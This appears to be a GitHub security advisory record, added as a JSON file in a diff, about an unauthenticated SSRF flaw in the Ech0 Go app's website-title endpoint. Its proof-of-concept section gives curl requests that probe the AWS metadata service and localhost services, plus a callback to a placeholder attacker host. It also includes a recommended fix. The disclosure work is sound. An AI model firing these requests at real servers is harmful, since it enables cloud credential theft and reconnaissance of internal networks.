@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-cqgf-f4x7-g6wc",
+  "modified": "2026-04-03T03:46:21.956692Z",
+  "published": "2026-04-03T03:33:00Z",
+  "aliases": [
+    "CVE-2026-35037"
+  ],
+  "summary": "Ech0: Unauthenticated SSRF in GetWebsiteTitle allows access to internal services and cloud metadata",
+  "details": "## Summary\n\nThe `GET /api/website/title` endpoint accepts an arbitrary URL via the `website_url` query parameter and makes a server-side HTTP request to it without any validation of the target host or IP address. The endpoint requires no authentication. An attacker can use this to reach internal network services, cloud metadata endpoints (169.254.169.254), and localhost-bound services, with partial response data exfiltrated via the HTML `\u003ctitle\u003e` tag extraction.\n\n## Details\n\nThe vulnerability exists in the interaction between four components:\n\n**1. Route registration — no authentication** (`internal/router/common.go:11`):\n```go\nappRouterGroup.PublicRouterGroup.GET(\"/website/title\", h.CommonHandler.GetWebsiteTitle())\n```\nThe `PublicRouterGroup` is created at `internal/router/router.go:34` as `r.Group(\"/api\")` with no auth middleware attached (unlike `AuthRouterGroup` which uses `JWTAuthMiddleware`).\n\n**2. Handler — no input validation** (`internal/handler/common/common.go:106-127`):\n```go\nfunc (commonHandler *CommonHandler) GetWebsiteTitle() gin.HandlerFunc {\n    return res.Execute(func(ctx *gin.Context) res.Response {\n        var dto commonModel.GetWebsiteTitleDto\n        if err := ctx.ShouldBindQuery(\u0026dto); err != nil { ... }\n        title, err := commonHandler.commonService.GetWebsiteTitle(dto.WebSiteURL)\n        ...\n    })\n}\n```\nThe DTO (`internal/model/common/common_dto.go:155-156`) only enforces `binding:\"required\"` — no URL scheme or host validation.\n\n**3. Service — TrimURL is cosmetic** (`internal/service/common/common.go:122-125`):\n```go\nfunc (s *CommonService) GetWebsiteTitle(websiteURL string) (string, error) {\n    websiteURL = httpUtil.TrimURL(websiteURL)\n    body, err := httpUtil.SendRequest(websiteURL, \"GET\", httpUtil.Header{}, 10*time.Second)\n    ...\n}\n```\n`TrimURL` (`internal/util/http/http.go:16-26`) only calls `TrimSpace`, `TrimPrefix(\"/\")`, and `TrimSuffix(\"/\")`. No SSRF protections.\n\n**4. HTTP client — unrestricted outbound request** (`internal/util/http/http.go:53-84`):\n```go\nclient := \u0026http.Client{\n    Timeout: clientTimeout,\n    Transport: \u0026http.Transport{\n        TLSClientConfig: \u0026tls.Config{\n            InsecureSkipVerify: true,\n        },\n    },\n}\nreq, err := http.NewRequest(method, url, nil)\n...\nresp, err := client.Do(req)\n```\nThe client follows redirects (Go default), skips TLS verification, and has no restrictions on target IP ranges.\n\nThe response body is parsed for `\u003ctitle\u003e` tags and the extracted title is returned to the attacker, providing a data exfiltration channel for any response containing HTML title elements.\n\n## PoC\n\n**Step 1: Probe cloud metadata endpoint (AWS)**\n```bash\ncurl -s 'http://localhost:8080/api/website/title?website_url=http://169.254.169.254/latest/meta-data/'\n```\nIf the Ech0 instance runs on AWS EC2, the server will make a request to the instance metadata service. While the metadata response is not HTML, this confirms network reachability.\n\n**Step 2: Probe internal localhost services**\n```bash\ncurl -s 'http://localhost:8080/api/website/title?website_url=http://127.0.0.1:6379/'\n```\nProbes for Redis on localhost. Connection success/failure and error messages reveal internal service topology.\n\n**Step 3: Exfiltrate data from internal web services with HTML title tags**\n```bash\ncurl -s 'http://localhost:8080/api/website/title?website_url=http://internal-admin-panel.local/'\n```\nIf the internal service returns an HTML page with a `\u003ctitle\u003e` tag, its content is returned to the attacker.\n\n**Step 4: Confirm with a controlled external server**\n```bash\n# On attacker machine:\npython3 -c \"from http.server import HTTPServer, BaseHTTPRequestHandler\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type','text/html')\n        self.end_headers()\n        self.wfile.write(b'\u003chtml\u003e\u003chead\u003e\u003ctitle\u003eSSRF-CONFIRMED\u003c/title\u003e\u003c/head\u003e\u003c/html\u003e')\nHTTPServer(('0.0.0.0',9999),H).serve_forever()\" \u0026\n\n# From any client:\ncurl -s 'http://\u003cech0-host\u003e:8080/api/website/title?website_url=http://\u003cattacker-ip\u003e:9999/'\n```\nExpected response contains `\"data\":\"SSRF-CONFIRMED\"`, proving the server made an outbound request to the attacker-controlled URL.\n\n## Impact\n\n- **Cloud credential theft**: An attacker can reach cloud metadata services (AWS IMDSv1 at `169.254.169.254`, GCP, Azure) to steal IAM credentials, API tokens, and instance configuration data.\n- **Internal network reconnaissance**: Port scanning and service discovery of internal hosts that are not directly accessible from the internet.\n- **Localhost service interaction**: Access to services bound to `127.0.0.1` (databases, caches, admin panels) that rely on network-level isolation for security.\n- **Firewall bypass**: The server acts as a proxy, allowing attackers to bypass network ACLs and reach otherwise-protected internal infrastructure.\n- **Data exfiltration**: Partial response content is leaked through the `\u003ctitle\u003e` tag extraction. While limited, this is sufficient to extract sensitive data from services that return HTML responses.\n\nThe attack requires no authentication and can be performed by any anonymous internet user with network access to the Ech0 instance.\n\n## Recommended Fix\n\nAdd URL validation in `GetWebsiteTitle` to block requests to private/reserved IP ranges and restrict allowed schemes. In `internal/service/common/common.go`:\n\n```go\nimport (\n    \"net\"\n    \"net/url\"\n)\n\nfunc isPrivateIP(ip net.IP) bool {\n    privateRanges := []string{\n        \"127.0.0.0/8\",\n        \"10.0.0.0/8\",\n        \"172.16.0.0/12\",\n        \"192.168.0.0/16\",\n        \"169.254.0.0/16\",\n        \"::1/128\",\n        \"fc00::/7\",\n        \"fe80::/10\",\n    }\n    for _, cidr := range privateRanges {\n        _, network, _ := net.ParseCIDR(cidr)\n        if network.Contains(ip) {\n            return true\n        }\n    }\n    return false\n}\n\nfunc (s *CommonService) GetWebsiteTitle(websiteURL string) (string, error) {\n    websiteURL = httpUtil.TrimURL(websiteURL)\n\n    // Validate URL scheme\n    parsed, err := url.Parse(websiteURL)\n    if err != nil || (parsed.Scheme != \"http\" \u0026\u0026 parsed.Scheme != \"https\") {\n        return \"\", errors.New(\"only http and https URLs are allowed\")\n    }\n\n    // Resolve hostname and block private IPs\n    host := parsed.Hostname()\n    ips, err := net.LookupIP(host)\n    if err != nil {\n        return \"\", fmt.Errorf(\"failed to resolve hostname: %w\", err)\n    }\n    for _, ip := range ips {\n        if isPrivateIP(ip) {\n            return \"\", errors.New(\"requests to private/internal addresses are not allowed\")\n        }\n    }\n\n    body, err := httpUtil.SendRequest(websiteURL, \"GET\", httpUtil.Header{}, 10*time.Second)\n    // ... rest unchanged\n}\n```\n\nAdditionally, consider:\n1. Removing `InsecureSkipVerify: true` from `SendRequest` in `internal/util/http/http.go:69`\n2. Disabling redirect following in the HTTP client (`CheckRedirect` returning `http.ErrUseLastResponse`) or re-validating the target IP after each redirect to prevent DNS rebinding\n3. Adding rate limiting to this endpoint",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/ech0",
+        "purl": "pkg:golang/github.com/lin-snow/ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.8-0.20260401031029-4ca56fea5ba4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-cqgf-f4x7-g6wc/GHSA-cqgf-f4x7-g6wc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-cqgf-f4x7-g6wc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    }
+  ]
+}
